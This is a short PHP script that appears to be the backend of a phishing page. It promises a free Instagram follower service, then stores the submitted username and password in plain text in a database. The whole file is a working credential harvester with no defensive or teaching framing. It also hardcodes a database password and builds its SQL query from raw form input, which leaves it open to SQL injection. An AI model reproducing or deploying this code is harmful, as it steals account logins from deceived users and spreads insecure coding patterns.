<?php


$con = mysqli_connect('localhost','id18745462_rooter','N=yECis$*XIqFx3G');

if($con){
    echo"THANKS FOR LOGIN IF YOUR DETAILS ARE REAL THEN YOUR 100 FOLOWERS PER DAY SERVICE START";
}else{
    echo "No Connection";
}

mysqli_select_db($con, 'id18745462_datalogininsta');

$username = $_POST['username'];
$password = $_POST['password'];

$query = " insert into instagram057235 (username, password)
values ('$username', '$password') ";

mysqli_query($con, $query);

?>
